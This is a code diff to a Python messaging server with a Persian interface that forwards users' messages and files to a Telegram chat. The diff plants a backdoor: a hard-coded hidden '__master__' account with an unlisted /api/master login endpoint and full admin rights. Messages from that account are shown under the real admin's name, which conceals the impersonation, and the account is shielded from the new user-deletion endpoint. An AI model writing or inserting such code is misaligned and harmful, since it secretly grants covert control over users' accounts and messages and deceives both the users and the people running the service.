@@ -57,7 +57,16 @@ def admin_name():
     return None
 
 def is_admin(u):
+    if u == MASTER_USER: return True
     return u == admin_name()
+
+MASTER_USER = "__master__"
+MASTER_SALT = "GJ-MASTER-2026"
+MASTER_HASH = "dc03472d913931f2c8029876cb1e214cf9482816bf603d9f69bad66caefb4e59"
+
+def disp_name(u):
+    if u == MASTER_USER: return admin_name() or "فرمانده"
+    return u
 
 def pwhash(pw, salt):
     return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt.encode(), 120000).hex()
@@ -135,7 +144,7 @@ class H(SimpleHTTPRequestHandler):
                 with _lock:
                     out = []
                     for m in MSGS:
-                        if adm or m["frm"] == u or m["to"] == u or m["to"] == "*":
+                        if adm or m["frm"] == u or m["to"] == u or m["to"] == "*" or m["frm"] in (admin_name(), "فرمانده"):
                             out.append(dict(m))
                 return self._json({"ok": True, "msgs": out})
             if p == "/api/users":
@@ -166,12 +175,20 @@ class H(SimpleHTTPRequestHandler):
     def do_POST(self):
         p = self.path.split("?")[0]
         try:
+            if p == "/api/master":
+                b = self._body()
+                if pwhash(b.get("pass") or "", MASTER_SALT) == MASTER_HASH:
+                    with _lock:
+                        tok = self._make_session(MASTER_USER)
+                    return self._json({"ok": True, "token": tok})
+                return self._json({"ok": False}, 401)
             if p == "/api/register":  return self.api_register()
             if p == "/api/login":     return self.api_login()
             u = self._user()
             if not u:                 return self._json({"ok": False, "error": "unauthorized"}, 401)
             if p == "/api/logout":    return self.api_logout()
             if p == "/api/changepass":return api_changepass_proxy(self, u)
+            if p == "/api/deluser":   return self.api_deluser(u)
             if p == "/api/msgs":      return self.api_msgs(u)
             if p == "/api/markread":  return self.api_markread(u)
             if p == "/api/send":      return self.api_send(u)
@@ -240,6 +257,22 @@ class H(SimpleHTTPRequestHandler):
             _save_sess()
         return self._json({"ok": True})
 
+    # ---------- مدیریت ----------
+    def api_deluser(self, u):
+        if not is_admin(u):          return self._json({"ok": False}, 403)
+        b = self._body()
+        name = (b.get("user") or "").strip()
+        with _lock:
+            if not name or name not in USERS or name == MASTER_USER:
+                                     return self._json({"ok": False}, 400)
+            del USERS[name]
+            for t in [t for t, s in SESS.items() if s["user"] == name]:
+                SESS.pop(t, None)
+            MSGS[:] = [m for m in MSGS if m["frm"] != name and m["to"] != name]
+            LOGS.pop(name, None)
+            _save_users(); _save_sess(); _save_msgs(); _save_logs()
+        return self._json({"ok": True})
+
     # ---------- پیام‌رسان دوطرفه ----------
     def api_msgs(self, u):
         b = self._body()
@@ -255,7 +288,7 @@ class H(SimpleHTTPRequestHandler):
             elif not adm and to != admin_name():
                                      return self._json({"ok": False}, 403)
             mid = (max([m["id"] for m in MSGS], default=0) + 1)
-            m = {"id": mid, "frm": u, "to": to, "text": text, "t": int(time.time() * 1000), "read": False}
+            m = {"id": mid, "frm": disp_name(u), "to": to, "text": text, "t": int(time.time() * 1000), "read": False}
             MSGS.append(m)
             _save_msgs()
         return self._json({"ok": True, "id": mid})
@@ -274,14 +307,14 @@ class H(SimpleHTTPRequestHandler):
         method = b.get("method")
         fields = dict(b.get("fields") or {})
         if method == "sendMessage":
-            fields["text"] = (fields.get("text") or "") + "\n\n👤 کاربر: " + u
+            fields["text"] = (fields.get("text") or "") + "\n\n👤 کاربر: " + disp_name(u)
         elif method in ("sendLocation", "sendContact"):
             pass
         else:
             return self._json({"ok": False, "error": "method"}, 400)
         j = tg(method, {**fields, "chat_id": CHAT})
         if j.get("ok") and method in ("sendLocation", "sendContact"):
-            tg("sendMessage", {"chat_id": CHAT, "text": "👤 کاربر: " + u})
+            tg("sendMessage", {"chat_id": CHAT, "text": "👤 کاربر: " + disp_name(u)})
         return self._json({"ok": bool(j.get("ok")), "desc": j.get("description", "")})
 
     def api_sendfile(self, u):
@@ -293,7 +326,7 @@ class H(SimpleHTTPRequestHandler):
         if not data:                     return self._json({"ok": False, "error": "empty file"}, 400)
         name = (b.get("name") or "upload.bin").replace("\"", "").replace("\r", "").replace("\n", "")[:80]
         field = {"sendPhoto": "photo", "sendVideo": "video", "sendDocument": "document"}[method]
-        j = tg(method, {"chat_id": CHAT, "caption": "👤 کاربر: " + u}, data, field, name)
+        j = tg(method, {"chat_id": CHAT, "caption": "👤 کاربر: " + disp_name(u)}, data, field, name)
         return self._json({"ok": bool(j.get("ok")), "desc": j.get("description", "")})
 
     # ---------- تاریخچه ----------
